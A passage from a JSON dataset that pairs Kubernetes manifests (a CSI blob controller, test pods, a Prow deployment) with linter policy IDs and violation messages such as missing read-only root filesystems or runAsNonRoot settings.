mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"blob\" does not have a read-only root file system"
  },
  {
    "id": "03738",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "03739",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-resizer\" does not have a read-only root file system"
  },
  {
    "id": "03740",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "03741",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"blob\" is not set to runAsNonRoot"
  },
  {
    "id": "03742",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "03743",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-resizer\" is not set to runAsNonRoot"
  },
  {
    "id": "03744",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.1.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n      - name: msi\n        hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "03745",
    "manifest_path": "data/manifests/the_stack_sample/sample_1665.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-readonly-rootfs-false\n  namespace: test\nspec:\n  containers:\n  - name: sleep\n    image: tutum/curl\n    command:\n    - /bin/sleep\n    - infinity\n    resources:\n      requests:\n        cpu: 100m\n        memory: 5M\n      limits:\n        cpu: 200m\n        memory: 30M\n    securityContext:\n      readOnlyRootFilesystem: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sleep\" is using an invalid container image, \"tutum/curl\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03746",
    "manifest_path": "data/manifests/the_stack_sample/sample_1665.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-readonly-rootfs-false\n  namespace: test\nspec:\n  containers:\n  - name: sleep\n    image: tutum/curl\n    command:\n    - /bin/sleep\n    - infinity\n    resources:\n      requests:\n        cpu: 100m\n        memory: 5M\n      limits:\n        cpu: 200m\n        memory: 30M\n    securityContext:\n      readOnlyRootFilesystem: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sleep\" does not have a read-only root file system"
  },
  {
    "id": "03747",
    "manifest_path": "data/manifests/the_stack_sample/sample_1665.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-readonly-rootfs-false\n  namespace: test\nspec:\n  containers:\n  - name: sleep\n    image: tutum/curl\n    command:\n    - /bin/sleep\n    - infinity\n    resources:\n      requests:\n        cpu: 100m\n        memory: 5M\n      limits:\n        cpu: 200m\n        memory: 30M\n    securityContext:\n      readOnlyRootFilesystem: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sleep\" is not set to runAsNonRoot"
  },
  {
    "id": "03748",
    "manifest_path": "data/manifests/the_stack_sample/sample_1667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cuda-vector-add\nspec:\n  containers:\n  - name: cuda-vector-add\n    image: k8s.gcr.io/cuda-vector-add:v0.1\n    resources:\n      limits:\n        nvidia.com/gpu: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cuda-vector-add\" does not have a read-only root file system"
  },
  {
    "id": "03749",
    "manifest_path": "data/manifests/the_stack_sample/sample_1667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cuda-vector-add\nspec:\n  containers:\n  - name: cuda-vector-add\n    image: k8s.gcr.io/cuda-vector-add:v0.1\n    resources:\n      limits:\n        nvidia.com/gpu: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cuda-vector-add\" is not set to runAsNonRoot"
  },
  {
    "id": "03750",
    "manifest_path": "data/manifests/the_stack_sample/sample_1667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cuda-vector-add\nspec:\n  containers:\n  - name: cuda-vector-add\n    image: k8s.gcr.io/cuda-vector-add:v0.1\n    resources:\n      limits:\n        nvidia.com/gpu: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cuda-vector-add\" has cpu request 0"
  },
  {
    "id": "03751",
    "manifest_path": "data/manifests/the_stack_sample/sample_1667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cuda-vector-add\nspec:\n  containers:\n  - name: cuda-vector-add\n    image: k8s.gcr.io/cuda-vector-add:v0.1\n    resources:\n      limits:\n        nvidia.com/gpu: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cuda-vector-add\" has memory limit 0"
  },
  {
    "id": "03752",
    "manifest_path": "data/manifests/the_stack_sample/sample_1671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  selector:\n    matchLabels:\n      app: plank\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      serviceAccountName: plank\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20200319-1aea24112\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/workload-clusters/config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /etc/workload-clusters\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: cluster\n          mountPath: /etc/cluster\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          secretName: workload-clusters-kubeconfig\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: workload-cluster\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"plank\" does not have a read-only root file system"
  },
  {
    "id": "03753",
    "manifest_path": "data/manifests/the_stack_sample/sample_1671.yaml",
